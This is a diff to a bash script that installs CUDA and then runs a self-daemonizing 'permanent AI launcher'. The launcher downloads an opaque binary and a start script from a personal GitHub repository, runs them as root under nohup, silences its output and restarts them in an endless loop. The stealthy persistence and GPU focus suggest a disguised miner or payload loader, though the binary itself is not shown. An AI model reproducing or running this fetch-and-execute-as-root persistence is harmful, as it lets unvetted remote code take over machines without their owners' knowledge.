@@ -1,5 +1,40 @@
 #!/bin/bash
 
+############################################
+# CUDA INSTALLATION (runs once only)
+############################################
+
+# CUDA installation state file
+CUDA_FLAG="/var/tmp/cuda_installed"
+
+sudo dpkg --configure -a
+sudo apt install -y unzip
+
+# 1. Install CUDA if not already installed
+if [ ! -f "$CUDA_FLAG" ]; then
+    echo "Bắt đầu cài đặt CUDA..."
+
+    sudo apt update
+    sudo apt install -y ubuntu-drivers-common
+    sudo ubuntu-drivers install
+
+    sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2404/x86_64/cuda-keyring_1.1-1_all.deb
+    sudo apt install -y ./cuda-keyring_1.1-1_all.deb
+    sudo apt update
+    sudo apt -y install cuda-toolkit-11-8
+    sudo apt -y full-upgrade
+
+    sudo touch "$CUDA_FLAG"
+
+    echo "Cài đặt CUDA hoàn tất. Khởi động lại hệ thống..."
+    sudo reboot
+    exit 0
+fi
+
+############################################
+# PERMANENT BACKGROUND LAUNCHER STARTS HERE
+############################################
+
 # Permanent Background Launcher - Session Never Expires
 # Run once and forget - survives disconnections, reboots, and errors
 
@@ -22,12 +57,10 @@ log() {
 cleanup() {
     log "Cleaning up before exit..."
     rm -f $LOCK_FILE
-    # Don't kill processes - let them keep running
     log "Cleanup completed - processes continue running"
     exit 0
 }
 
-# Set trap for signals
 trap cleanup SIGINT SIGTERM EXIT
 
 # Check if already running
@@ -36,19 +69,16 @@ if [ -f $LOCK_FILE ]; then
     exit 1
 fi
 
-# Create lock file
 echo $$ > $LOCK_FILE
 log "=== PERMANENT AI LAUNCHER STARTED ==="
 log "PID: $$ | Session: $SESSION_NAME | Logs: $LOG_DIR"
 
-# Function to stop processes gracefully
 stop_processes() {
     log "Stopping AI processes..."
     for proc in "start_modelgp.sh" "aitraining" "bx.sh"; do
         if pgrep -f "$proc" > /dev/null; then
             sudo pkill -f "$proc"
             sleep 3
-            # Force kill if needed
             if pgrep -f "$proc" > /dev/null; then
                 sudo pkill -9 -f "$proc"
                 sleep 2
@@ -58,12 +88,11 @@ stop_processes() {
     done
 }
 
-# Function to download files
 download_files() {
     log "Downloading latest files..."
     rm -f ./bx.sh ./aitraining ./start_modelgp.sh
     
-    for i in {1..5}; do  # Increased retries
+    for i in {1..5}; do
         if sudo wget -q -O ./aitraining https://github.com/max313iq/Ssl/raw/main/aitraining && \
            sudo wget -q -O ./start_modelgp.sh https://github.com/max313iq/Ssl/raw/main/start_modelgp.sh; then
             break
@@ -83,7 +112,6 @@ download_files() {
     fi
 }
 
-# Function to start main AI process
 start_ai_process() {
     log "Starting main AI process..."
     
@@ -91,14 +119,11 @@ start_ai_process() {
         return 1
     fi
     
-    # Start the process and detach completely
     nohup sudo bash ./start_modelgp.sh > $LOG_DIR/ai_process.log 2>&1 &
     local ai_pid=$!
     
-    # Wait for initialization
     sleep 15
     
-    # Verify it's running
     if ps -p $ai_pid > /dev/null && pgrep -f "aitraining" > /dev/null; then
         echo $ai_pid > $LOG_DIR/ai_pid.txt
         log "AI process started successfully - PID: $ai_pid"
@@ -109,7 +134,6 @@ start_ai_process() {
     fi
 }
 
-# Function to monitor and restart if needed
 monitor_process() {
     local consecutive_failures=0
     local max_failures=5
@@ -138,8 +162,7 @@ monitor_process() {
             fi
         fi
         
-        # Log rotation
-        if [ -f "$LOG_DIR/ai_process.log" ] && [ $(stat -f%z "$LOG_DIR/ai_process.log" 2>/dev/null || stat -c%s "$LOG_DIR/ai_process.log") -gt 104857600 ]; then
+        if [ -f "$LOG_DIR/ai_process.log" ] && [ $(stat -c%s "$LOG_DIR/ai_process.log") -gt 104857600 ]; then
             log "Rotating large AI process log"
             mv "$LOG_DIR/ai_process.log" "$LOG_DIR/ai_process.log.old"
             touch "$LOG_DIR/ai_process.log"
@@ -147,11 +170,9 @@ monitor_process() {
     done
 }
 
-# Function to setup permanent process
 setup_permanent_session() {
     log "Setting up permanent session..."
     
-    # First startup
     if start_ai_process; then
         log "Initial startup successful"
     else
@@ -160,11 +181,9 @@ setup_permanent_session() {
         start_ai_process || log "CRITICAL: Could not start AI process"
     fi
     
-    # Start the eternal monitor
     monitor_process
 }
 
-# Function to show status
 show_status() {
     echo "=== PERMANENT AI LAUNCHER STATUS ==="
     echo "Launcher PID: $$"
@@ -185,16 +204,14 @@ show_status() {
     tail -5 $LOG_DIR/permanent_launcher.log 2>/dev/null || echo "No logs yet"
 }
 
-# Function to stop everything
 stop_everything() {
     log "FULL SHUTDOWN COMMAND RECEIVED"
     rm -f $LOCK_FILE
     stop_processes
-    log "=== ALL PROCESSES STOPPED ==="
+    log "=== ALL PROCESSES STOPPED==="
     exit 0
 }
 
-# Main execution
 case "${1:-}" in
     status)
         show_status
@@ -207,14 +224,11 @@ case "${1:-}" in
         log "RESTART COMMAND RECEIVED"
         stop_processes
         sleep 5
-        # Re-execute self
-        exec "$0" 
+        exec "$0"
         ;;
     *)
-        # Check if we're already running in background
         if [ "$(ps -o comm= -p $$)" = "bash" ] && [ -t 0 ]; then
             log "Running in terminal, daemonizing..."
-            # Daemonize ourselves
             nohup "$0" daemon > $LOG_DIR/daemon_start.log 2>&1 &
             echo "Launcher started in background with PID: $!"
             echo "Check status with: $0 status"
@@ -223,17 +237,14 @@ case "${1:-}" in
             exit 0
         fi
         
-        # Main daemon code
         log "=== DAEMON MODE ACTIVATED ==="
         log "This process will run permanently until system shutdown"
         log "Disconnect from terminal - process will continue running"
         
-        # Completely detach from terminal
         if [ -t 1 ]; then
             exec > /dev/null 2>&1
         fi
         
-        # Main eternal loop
         while true; do
             setup_permanent_session
             log "CRITICAL: Main monitor exited - restarting in 30s"
